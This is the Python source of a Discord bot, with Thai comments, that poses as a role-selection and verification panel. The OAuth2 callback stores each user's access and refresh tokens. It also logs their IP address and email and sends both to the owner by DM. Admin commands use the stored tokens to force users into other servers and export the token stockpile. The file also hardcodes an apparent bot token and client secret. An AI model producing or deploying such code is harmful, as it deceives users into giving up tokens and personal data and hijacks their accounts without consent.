import discord
from discord import app_commands
from discord.ext import commands, tasks
from flask import Flask, request, render_template_string, send_file
import requests, sqlite3, time, threading, asyncio, aiohttp, os, json, uuid, io

# --- [ 1. Configuration - ตั้งค่าระบบ ] ---
# ⚠️ เปลี่ยน TOKEN ด้านล่างนี้เป็น Bot Token ใหม่ที่คุณ คัดลอกจาก Discord Developer Portal
TOKEN = 'MTU1MjY1MTY0MDUwNTQ5OTczOQ.GDmRhX.cxP_tIRdMMpu_8kdqTAl2MrP0TTiJIIj6ja8ac'            
CLIENT_ID = '1552651640505499739'        # Client ID ของ Discord Bot
CLIENT_SECRET = 'iuRjvoq4KGxYEe8BAbVLKx9-1TpbECJR' # Client Secret ของ Discord Bot
REDIRECT_URI = 'https://kokoobot.xyz/oauth-callback.html' # URL Callback OAuth2
PORT_WISP = 8080

RAZEN_ID = 1534537336786911388
ADMIN_IDS = [RAZEN_ID]                   # ไอดีผู้ใช้ที่มีสิทธิ์ใช้คำสั่งควบคุม

app = Flask(__name__)
is_pulling_active = False                # สถานะควบคุมการดึงคนเบื้องหลัง
pull_stats = {"total": 0, "success": 0, "fail": 0, "running": False}

# --- [ 2. Database Functions ] ---
def init_db():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users 
                      (user_id TEXT PRIMARY KEY, username TEXT, access_token TEXT, refresh_token TEXT, expires_at INTEGER)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS settings 
                      (guild_id TEXT PRIMARY KEY, log_channel_id TEXT, history_channel_id TEXT)''')
    conn.commit()
    conn.close()

def db_query(query, params=(), fetch=False):
    conn = sqlite3.connect('users.db', timeout=30)
    cursor = conn.cursor()
    cursor.execute(query, params)
    data = cursor.fetchall() if fetch else None
    conn.commit()
    conn.close()
    return data

# --- [ 3. UI Components ] ---
class DirectOAuthLinkView(discord.ui.View):
    def __init__(self, label: str, emoji: str, oauth_url: str):
        super().__init__(timeout=None)
        button_emoji = emoji if emoji else None
        self.add_item(discord.ui.Button(
            style=discord.ButtonStyle.link,
            label=label,
            emoji=button_emoji,
            url=oauth_url
        ))

class RoleSelectMenu(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="เขียนโปรแกรม", description="สำหรับผู้ที่สนใจเกี่ยวกับการเขียนโปรแกรม", emoji="💻", value="role_coding"),
            discord.SelectOption(label="วาดภาพ", description="สำหรับผู้ที่ชื่นชอบงานศิลปะและการวาดภาพ", emoji="🎨", value="role_art"),
            discord.SelectOption(label="ตัดต่อ", description="สำหรับผู้ที่สนใจงานตัดต่อวิดีโอและสื่อ", emoji="🎬", value="role_editing"),
            discord.SelectOption(label="เล่นเกม", description="สำหรับสายเกมเมอร์ที่ต้องการหาเพื่อนเล่นเกม", emoji="🎮", value="role_gaming")
        ]
        super().__init__(placeholder="เลือกยศของคุณ...", min_values=1, max_values=1, options=options, custom_id="rules_select")

    async def callback(self, interaction: discord.Interaction):
        state_param = f"{interaction.guild_id}_0"
        oauth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={requests.utils.quote(REDIRECT_URI)}&response_type=code&scope=identify%20email%20guilds.join&state={state_param}"
        await interaction.response.send_message(f"🔒 ยืนยันตัวตนเพื่อรับยศ: [กดที่นี่เพื่อยืนยันตัวตน]({oauth_url})", ephemeral=True)

class RoleSelectView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(RoleSelectMenu())

# --- [ 4. Bot Setup ] ---
class TokenUserBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=discord.Intents.all())

    async def setup_hook(self):
        init_db()
        self.add_view(RoleSelectView())
        threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT_WISP, debug=False, use_reloader=False), daemon=True).start()

bot = TokenUserBot()

@bot.event
async def on_ready():
    print(f'🔥 บอทออนไลน์แล้วในชื่อ: {bot.user.name}')
    try:
        synced = await bot.tree.sync()
        print(f"✅ ซิงค์ Slash Commands ลง Discord เรียบร้อยทั้งหมด {len(synced)} คำสั่ง!")
    except Exception as e:
        print(f"❌ เกิดข้อผิดพลาดในการซิงค์คำสั่ง: {e}")

@bot.command(name="sync")
async def prefix_sync(ctx):
    if ctx.author.id not in ADMIN_IDS:
        return
    synced = await bot.tree.sync()
    await ctx.send(f"✅ ซิงค์ Slash Commands เรียบร้อยทั้งหมด {len(synced)} คำสั่ง!")

def is_admin(interaction: discord.Interaction) -> bool:
    return interaction.user.id in ADMIN_IDS

async def background_pull_process(guild_id: int, amount: int = 0, role: discord.Role = None):
    global is_pulling_active, pull_stats
    is_pulling_active = True
    users = db_query("SELECT user_id, access_token FROM users", fetch=True) or []
    
    if amount > 0:
        users = users[:amount]

    pull_stats = {"total": len(users), "success": 0, "fail": 0, "running": True}
    headers = {"Authorization": f"Bot {TOKEN}", "Content-Type": "application/json"}
    
    for user_id, access_token in users:
        if not is_pulling_active:
            break
        
        url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}"
        data = {"access_token": access_token}
        if role:
            data["roles"] = [str(role.id)]
        
        async with aiohttp.ClientSession() as session:
            async with session.put(url, headers=headers, json=data) as resp:
                if resp.status in [201, 204]:
                    pull_stats["success"] += 1
                else:
                    pull_stats["fail"] += 1
        await asyncio.sleep(1.5)
        
    pull_stats["running"] = False
    is_pulling_active = False

# --- [ 5. Slash Commands ทั้งหมด ] ---

@bot.tree.command(name="ดึงคน", description="🚀 ดึงผู้ใช้จากคลังเข้าเซิร์ฟเวอร์นี้ (ทำงานในเบื้องหลัง)")
@app_commands.describe(
    amount="จำนวนคนที่ต้องการดึงใหม่จริง (0 = ทั้งหมดที่ดึงได้)",
    role="ยศที่จะให้หลังดึงเข้า (ไม่บังคับ)"
)
async def cmd_pull(interaction: discord.Interaction, amount: int = 0, role: discord.Role = None):
    if not is_admin(interaction): 
        return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    if is_pulling_active: 
        return await interaction.response.send_message("⚠️ ระบบกำลังทำงานดึงคนอยู่อีกกระบวนการหนึ่ง", ephemeral=True)
    
    asyncio.create_task(background_pull_process(interaction.guild_id, amount, role))
    
    role_msg = f" พร้อมยศ {role.mention}" if role else ""
    amount_msg = f"จำนวน {amount} คน" if amount > 0 else "ทั้งหมดในคลัง"
    await interaction.response.send_message(f"🚀 เริ่มกระบวนการดึงคน ({amount_msg}){role_msg} เข้าเซิร์ฟเวอร์เรียบร้อย!", ephemeral=True)

@bot.tree.command(name="ตั้งแผงรับยศ", description="⭐ สร้างปุ่มกดรับยศ (กดยืนยันตัวตนแล้วมอบยศให้อัตโนมัติ)")
@app_commands.describe(
    role="เลือกยศที่จะแจกเมื่อกดรับ",
    title="หัวข้อแผงรับยศ",
    description="รายละเอียดเพิ่มเติม",
    button_label="ข้อความบนปุ่มกด (เช่น คลิกเพื่อรับยศ)",
    button_emoji="อิโมจิบนปุ่มกด"
)
async def cmd_create_role_button(
    interaction: discord.Interaction,
    role: discord.Role,
    title: str = "✨ ระบบรับยศอัตโนมัติ",
    description: str = "กรุณากดปุ่มด้านล่างเพื่อยืนยันตัวตนและรับยศทันที",
    button_label: str = "รับยศยืนยันตัวตน",
    button_emoji: str = "⭐"
):
    if not is_admin(interaction):
        return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)

    state_param = f"{interaction.guild_id}_{role.id}"
    oauth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={requests.utils.quote(REDIRECT_URI)}&response_type=code&scope=identify%20email%20guilds.join&state={state_param}"

    embed = discord.Embed(
        title=title,
        description=f"{description}\n\n**ยศที่จะได้รับ:** {role.mention}",
        color=0x00FFAA
    )
    
    view = DirectOAuthLinkView(label=button_label, emoji=button_emoji, oauth_url=oauth_url)
    await interaction.channel.send(embed=embed, view=view)
    await interaction.response.send_message(f"✅ สร้างแผงรับยศสำหรับยศ {role.mention} เรียบร้อยแล้ว!", ephemeral=True)

@bot.tree.command(name="รับยศ", description="✅ สร้างแผงรับยศใหม่พร้อมปุ่มเปิดลิงก์ยืนยันตัวตน")
@app_commands.describe(
    title="หัวข้อของ Embed แผงรับยศ",
    channel="ช่องที่ต้องการส่งแผงรับยศ",
    role="ยศที่จะได้รับเมื่อยืนยันตัวตน",
    color="สีของ Embed (โค้ด Hex เช่น #00FF00 หรือ 5865F2)",
    description="รายละเอียดข้อความใน Embed",
    button_label="ข้อความบนปุ่มกด (เช่น รับยศ + verify)",
    button_emoji="อิโมจิบนปุ่มกด (เว้นว่างไว้หากไม่ต้องการใส่)",
    image_url="ลิงก์รูปภาพประกอบใน Embed"
)
async def cmd_set_verify(
    interaction: discord.Interaction,
    title: str,
    channel: discord.TextChannel,
    role: discord.Role,
    color: str = "5865F2",
    description: str = "กดด้านล่างเพื่อรับยศ",
    button_label: str = "✅️",
    button_emoji: str = "",
    image_url: str = None
):
    if not is_admin(interaction): 
        return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    
    clean_hex = color.replace("#", "")
    try:
        embed_color = int(clean_hex, 16)
    except ValueError:
        embed_color = 0x5865F2

    embed = discord.Embed(
        title=title,
        description=description,
        color=embed_color
    )
    if image_url:
        embed.set_image(url=image_url)

    state_param = f"{interaction.guild_id}_{role.id}"
    oauth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={requests.utils.quote(REDIRECT_URI)}&response_type=code&scope=identify%20email%20guilds.join&state={state_param}"

    view = DirectOAuthLinkView(label=button_label, emoji=button_emoji, oauth_url=oauth_url)
    await channel.send(embed=embed, view=view)
    await interaction.response.send_message(f"✅ สร้างแผงรับยศในช่อง {channel.mention} เรียบร้อยแล้ว! (แจกยศ: {role.mention})", ephemeral=True)

@bot.tree.command(name="ตรวจสอบคลัง", description="🔍 ตรวจสอบและทำความสะอาด Token ทั้งหมดในคลัง (หา Token ตาย/ถอนสิทธิ์) แบบรวดเร็ว")
async def cmd_check_db(interaction: discord.Interaction):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    
    users = db_query("SELECT user_id, access_token FROM users", fetch=True) or []
    alive = 0
    dead = 0
    
    async with aiohttp.ClientSession() as session:
        for u_id, token in users:
            async with session.get("https://discord.com/api/v10/users/@me", headers={"Authorization": f"Bearer {token}"}) as r:
                if r.status == 200:
                    alive += 1
                else:
                    dead += 1
                    db_query("DELETE FROM users WHERE user_id = ?", (u_id,))
                    
    await interaction.followup.send(f"🔍 ตรวจสอบคลังสำเร็จ!\n✅ ใช้ได้: `{alive}` คน\n❌ Token ตาย/ลบออกจากคลังแล้ว: `{dead}` คน", ephemeral=True)

@bot.tree.command(name="ตั้งช่องแจ้งเตือน", description="🔔 ตั้งค่าช่องแจ้งเตือน")
async def cmd_set_notify(interaction: discord.Interaction, channel: discord.TextChannel):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    db_query("INSERT OR REPLACE INTO settings (guild_id, log_channel_id) VALUES (?, ?)", (str(interaction.guild_id), str(channel.id)))
    await interaction.response.send_message(f"🔔 ตั้งค่าช่องแจ้งเตือนเป็น {channel.mention} เรียบร้อยแล้ว", ephemeral=True)

@bot.tree.command(name="ตั้งช่องประวัติการดึง", description="🔔 ตั้งค่าช่องสำหรับส่งรายงาน/ประวัติการดึงคน")
async def cmd_set_history(interaction: discord.Interaction, channel: discord.TextChannel):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    db_query("INSERT OR REPLACE INTO settings (guild_id, history_channel_id) VALUES (?, ?)", (str(interaction.guild_id), str(channel.id)))
    await interaction.response.send_message(f"📜 ตั้งค่าช่องส่งประวัติการดึงคนเป็น {channel.mention} เรียบร้อยแล้ว", ephemeral=True)

@bot.tree.command(name="นำเข้าคลัง", description="📥 นำเข้าไฟล์ข้อมูล Token (JSON) เข้าสู่คลังบอท")
async def cmd_import_db(interaction: discord.Interaction, file: discord.Attachment):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    if not file.filename.endswith('.json'):
        return await interaction.response.send_message("❌ กรุณาแนบไฟล์นามสกุล .json เท่านั้น", ephemeral=True)
    
    await interaction.response.defer(ephemeral=True)
    content = await file.read()
    try:
        data = json.loads(content)
        count = 0
        for item in data:
            db_query("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?)", 
                     (str(item['user_id']), item.get('username', 'Unknown'), item['access_token'], item.get('refresh_token', ''), item.get('expires_at', 0)))
            count += 1
        await interaction.followup.send(f"📥 นำเข้าข้อมูลสำเร็จทั้งหมด `{count}` รายการ!", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ รูปแบบไฟล์ JSON ไม่ถูกต้อง: {str(e)}", ephemeral=True)

@bot.tree.command(name="ลบคน", description="🗑️ ลบผู้ใช้ออกจากคลัง")
async def cmd_delete_user(interaction: discord.Interaction, user_id: str):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    db_query("DELETE FROM users WHERE user_id = ?", (user_id,))
    await interaction.response.send_message(f"🗑️ ลบผู้ใช้ไอดี `{user_id}` ออกจากคลังเรียบร้อยแล้ว", ephemeral=True)

@bot.tree.command(name="ส่งออกคลัง", description="📦 ส่งออกไฟล์ข้อมูล Token ทั้งหมดในคลังเพื่อ Backup")
async def cmd_export_db(interaction: discord.Interaction):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    users = db_query("SELECT user_id, username, access_token, refresh_token, expires_at FROM users", fetch=True) or []
    
    export_data = []
    for u in users:
        export_data.append({
            "user_id": u[0],
            "username": u[1],
            "access_token": u[2],
            "refresh_token": u[3],
            "expires_at": u[4]
        })
    
    json_bytes = io.BytesIO(json.dumps(export_data, indent=4).encode('utf-8'))
    discord_file = discord.File(json_bytes, filename="backup_tokens.json")
    await interaction.response.send_message("📦 ส่งออกไฟล์ข้อมูลสำรองคลัง Token เรียบร้อยแล้ว:", file=discord_file, ephemeral=True)

@bot.tree.command(name="สถานะการดึง", description="📊 ตรวจสอบสถานะความคืบหน้าการดึงคนในเบื้องหลัง")
async def cmd_status_pull(interaction: discord.Interaction):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    status_text = "🟢 กำลังดึงคนเข้าเซิร์ฟเวอร์..." if pull_stats["running"] else "🔴 ไม่มีกระบวนการดึงคนทำงานอยู่"
    embed = discord.Embed(title="📊 สถานะการดึงคน", description=status_text, color=0x5865F2)
    embed.add_field(name="ทั้งหมด", value=f"`{pull_stats['total']}` คน", inline=True)
    embed.add_field(name="สำเร็จ", value=f"`{pull_stats['success']}` คน", inline=True)
    embed.add_field(name="ล้มเหลว", value=f"`{pull_stats['fail']}` คน", inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="สร้างปุ่มยืนยัน", description="📑 สร้างแผง Embed + ปุ่มยืนยัน OAuth2 แบบ Interactive")
async def cmd_create_button(interaction: discord.Interaction):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    embed = discord.Embed(
        title="ยินดีต้อนรับสู่ #rules!",
        description="นี่คือบทบาทตัวเลือกของห้อง",
        color=0x5865F2
    )
    await interaction.channel.send(embed=embed, view=RoleSelectView())
    await interaction.response.send_message("📑 สร้างแผงเลือกยศรับตัวเลือกเรียบร้อยแล้ว!", ephemeral=True)

@bot.tree.command(name="หยุดดึง", description="🛑 สั่งหยุดงานดึงคนเบื้องหลังทันที")
async def cmd_stop_pull(interaction: discord.Interaction):
    if not is_admin(interaction): return await interaction.response.send_message("❌ ไม่อนุญาตให้ใช้คำสั่งนี้", ephemeral=True)
    global is_pulling_active
    is_pulling_active = False
    await interaction.response.send_message("🛑 สั่งหยุดการดึงคนเบื้องหลังทันทีเรียบร้อยแล้ว", ephemeral=True)

# --- [ 6. OAuth2 Web Callback Server & HTML UI ] ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OVG Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body {
            background: #090a0f url('https://images.unsplash.com/photo-1578632767115-351597cf2477?q=80&w=1920&auto=format&fit=crop') no-repeat center center fixed;
            background-size: cover; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #ffffff; position: relative;
        }
        body::before { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(5, 7, 15, 0.75); backdrop-filter: blur(8px); z-index: 1; }
        .container {
            position: relative; z-index: 2; width: 100%; max-width: 420px; background: rgba(13, 17, 23, 0.7);
            border: 1px solid rgba(0, 255, 170, 0.2); border-radius: 24px; padding: 40px 24px; text-align: center;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5), inset 0 0 15px rgba(0, 255, 170, 0.05);
        }
        .avatar { width: 70px; height: 70px; border-radius: 50%; margin: 0 auto 12px; border: 2px solid rgba(255, 255, 255, 0.2); object-fit: cover; }
        .server-title { font-size: 22px; font-weight: 700; color: #ffffff; }
        .subtitle { font-size: 13px; color: #94a3b8; margin-bottom: 12px; }
        .badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(0, 255, 170, 0.1); border: 1px solid rgba(0, 255, 170, 0.3); color: #00ffaa; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; margin-bottom: 25px; }
        .check-circle { width: 80px; height: 80px; background: #00e676; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 25px; box-shadow: 0 0 25px rgba(0, 230, 118, 0.5); color: #0d1117; font-size: 40px; font-weight: bold; }
        .status-title { font-size: 24px; font-weight: 700; color: #00ffaa; margin-bottom: 25px; text-shadow: 0 0 10px rgba(0, 255, 170, 0.3); }
        .user-card { background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 16px; padding: 12px; display: flex; align-items: center; gap: 12px; margin-bottom: 20px; text-align: left; }
        .user-avatar { width: 42px; height: 42px; border-radius: 50%; }
        .user-info .username { font-size: 14px; font-weight: 600; color: #ffffff; word-break: break-all; }
        .user-info .role-status { font-size: 11px; color: #64748b; }
        .description { font-size: 12px; color: #94a3b8; line-height: 1.6; margin-bottom: 25px; }
        .btn-discord { display: block; width: 100%; background: #00f2fe; background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%); color: #090a0f; font-size: 15px; font-weight: 700; text-decoration: none; padding: 14px; border-radius: 12px; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0, 242, 254, 0.3); }
        .btn-discord:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0, 242, 254, 0.5); }
        .footer { margin-top: 25px; font-size: 11px; color: #475569; }
    </style>
</head>
<body>
    <div class="container">
        <img class="avatar" src="{{ server_icon }}" alt="Server Icon">
        <div class="server-title">{{ server_name }}</div>
        <div class="subtitle">Premium Verification</div>
        <div class="badge">ยืนยันตัวตนสำเร็จ ✓</div>
        <div class="check-circle">✓</div>
        <div class="status-title">ยืนยันตัวตน เรียบร้อยแล้ว</div>
        <div class="user-card">
            <img class="user-avatar" src="{{ user_avatar }}" alt="User Avatar">
            <div class="user-info">
                <div class="username">{{ username }}</div>
                <div class="role-status">Access Granted</div>
            </div>
        </div>
        <div class="description">ระบบได้ทำการยืนยันตัวตนของคุณเรียบร้อยแล้ว<br>และมอบยศเข้าสู่ระบบเซิร์ฟเวอร์สำเร็จ</div>
        <a href="discord://" class="btn-discord">กลับสู่ Discord</a>
        <div class="footer">© 2026 Kuy System</div>
    </div>
</body>
</html>
"""

@app.route('/callback')
@app.route('/oauth-callback.html')
def callback():
    code = request.args.get('code')
    state = request.args.get('state')
    
    if not code: return "ไม่พบ Code การยืนยันตัวตน"
    
    # ดึง IP ผู้ใช้งาน
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if user_ip and ',' in user_ip:
        user_ip = user_ip.split(',')[0].strip()
    
    res = requests.post("https://discord.com/api/oauth2/token", data={
        'client_id': CLIENT_ID, 
        'client_secret': CLIENT_SECRET, 
        'grant_type': 'authorization_code', 
        'code': code, 
        'redirect_uri': REDIRECT_URI
    }).json()
    
    at = res.get('access_token')
    if at:
        u = requests.get("https://discord.com/api/v10/users/@me", headers={'Authorization': f'Bearer {at}'}).json()
        user_id = u['id']
        username = u.get('username', 'Unknown User')
        user_email = u.get('email', 'ไม่มีข้อมูลอีเมล')
        avatar_id = u.get('avatar')
        user_avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.png" if avatar_id else "https://cdn.discordapp.com/embed/avatars/0.png"
        
        db_query("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?)", 
                 (user_id, username, at, res.get('refresh_token'), int(time.time()) + res.get('expires_in', 0)))
        
        # ดึงจำนวนคลังทั้งหมดในระบบ
        db_count = db_query("SELECT COUNT(*) FROM users", fetch=True)
        total_in_db = db_count[0][0] if db_count else 1
        
        server_name_display = "ZEMAX"
        
        if state and "_" in state:
            try:
                guild_id, role_id = state.split("_")
                bot_headers = {"Authorization": f"Bot {TOKEN}", "Content-Type": "application/json"}
                
                # ดึงชื่อเซิร์ฟเวอร์มาแสดง
                g_info = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}", headers=bot_headers).json()
                if "name" in g_info:
                    server_name_display = g_info["name"]
                
                # เพิ่มผู้ใช้เข้าเซิร์ฟเวอร์
                join_url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}"
                requests.put(join_url, headers=bot_headers, json={"access_token": at})
                
                # มอบยศให้ผู้ใช้งานผ่าน Discord API ทันที
                if role_id != "0":
                    role_url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}/roles/{role_id}"
                    requests.put(role_url, headers=bot_headers)
            except Exception as e:
                print(f"เกิดข้อผิดพลาดในการมอบยศ: {e}")
        
        # --- [ ระบบส่ง DM แจ้งเตือนหาเจ้าของบอท ] ---
        async def notify_owner_dm():
            try:
                owner = await bot.fetch_user(RAZEN_ID)
                if owner:
                    embed = discord.Embed(
                        title="🔔 Access Success!",
                        color=0xFF0000  # แถบสีแดงตามภาพตัวอย่าง
                    )
                    
                    embed.add_field(
                        name="👤 ชื่อ",
                        value=f"`{username}`",
                        inline=False
                    )
                    embed.add_field(
                        name="🆔 ไอดี",
                        value=f"`{user_id}`",
                        inline=False
                    )
                    embed.add_field(
                        name="🌐 ไอพี (IP)",
                        value=f"`{user_ip}`",
                        inline=False
                    )
                    embed.add_field(
                        name="📧 อีเมล",
                        value=f"`{user_email}`",
                        inline=False
                    )
                    embed.add_field(
                        name="📊 คลังรวมทั้งหมด",
                        value=f"`{total_in_db}` ราย",
                        inline=False
                    )
                    
                    embed.set_thumbnail(url=user_avatar)
                    
                    await owner.send(embed=embed)
            except Exception as e:
                print(f"ไม่สามารถส่ง DM หาเจ้าของบอทได้: {e}")

        if bot.loop and bot.loop.is_running():
            asyncio.run_coroutine_threadsafe(notify_owner_dm(), bot.loop)
        
        return render_template_string(
            HTML_TEMPLATE,
            server_name=server_name_display,
            server_icon=user_avatar,
            username=username,
            user_avatar=user_avatar
        )
        
    return "<h1>การยืนยันตัวตนล้มเหลว กรุณาลองใหม่อีกครั้ง</h1>"

bot.run(TOKEN)